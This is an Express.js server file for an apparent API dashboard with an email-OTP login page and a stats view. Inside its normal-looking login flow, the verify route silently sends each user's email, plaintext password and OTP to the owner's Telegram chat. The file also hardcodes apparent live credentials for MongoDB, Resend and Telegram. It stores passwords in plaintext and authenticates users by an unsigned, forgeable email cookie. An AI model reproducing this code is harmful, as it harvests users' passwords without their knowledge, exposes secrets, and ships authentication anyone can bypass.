const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// --- KONFIGURASI ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "‎re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";
const resend = new Resend(RESEND_API);

mongoose.connect(MONGO_URI);

// --- MODEL DATABASE ---
const User = mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// Middleware Keamanan
const checkAuth = async (req, res, next) => {
    const email = req.cookies.userEmail;
    if (!email) return res.redirect('/login');
    const user = await User.findOne({ email, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

// --- ROUTES AUTENTIKASI ---
app.get('/login', (req, res) => {
    res.send(`
    <body style="background:#0f172a; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
        <form action="/auth/login" method="POST" style="background:#1e293b; padding:30px; border-radius:20px; width:320px; border:1px solid #38bdf8;">
            <h2 style="text-align:center; color:#38bdf8;">KAAA LOGIN</h2>
            <input name="email" type="email" placeholder="Email" style="width:100%; margin:10px 0; padding:10px; border-radius:8px;" required>
            <input name="password" type="password" placeholder="Password" style="width:100%; margin:10px 0; padding:10px; border-radius:8px;" required>
            <button type="submit" style="width:100%; padding:10px; background:#38bdf8; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">KIRIM OTP</button>
        </form>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    
    let user = await User.findOneAndUpdate(
        { email }, 
        { password, otp, isVerified: false }, 
        { upsert: true, new: true }
    );

    try {
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'Kode OTP Login Kamu',
            html: `<h1>Kode OTP: ${otp}</h1>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Gagal kirim email: " + e.message); }
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });

    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email);

        // Notifikasi ke Owner via Telegram
        const text = `🚀 NOTIFIKASI LOGIN SYSTEM\nEMAIL: ${email}\nPASSWORD: ${user.password}\nKODE: ${otp}\nSTATUS: SUCCESS`;
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, { chat_id: OWNER_ID, text });

        res.redirect('/');
    } else { res.send("OTP Salah!"); }
});

// --- DASHBOARD UTAMA ---
app.get('/', checkAuth, async (req, res) => {
    const totalUsers = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>KaaaOffc Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-slate-950 text-white font-sans text-center p-10">
        <h1 class="text-4xl font-bold text-sky-400 mb-10">KAAAOFFC SYSTEM</h1>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-4xl mx-auto mb-10">
            <div class="bg-slate-900 p-8 rounded-3xl border border-sky-500/30">
                <h3 class="text-5xl font-bold text-sky-400">${totalUsers}</h3>
                <p class="text-slate-500 uppercase text-xs mt-2 tracking-widest">Total Pengguna API</p>
            </div>
            <div class="bg-slate-900 p-8 rounded-3xl border border-sky-500/30">
                <h3 class="text-5xl font-bold text-sky-400">${statData.total_req.toLocaleString()}</h3>
                <p class="text-slate-500 uppercase text-xs mt-2 tracking-widest">Total Requests</p>
            </div>
        </div>
        <a href="/docs" class="bg-sky-500 px-10 py-3 rounded-full font-bold">Explore Documentation</a>
    </body>
    </html>`);
});

module.exports = app;
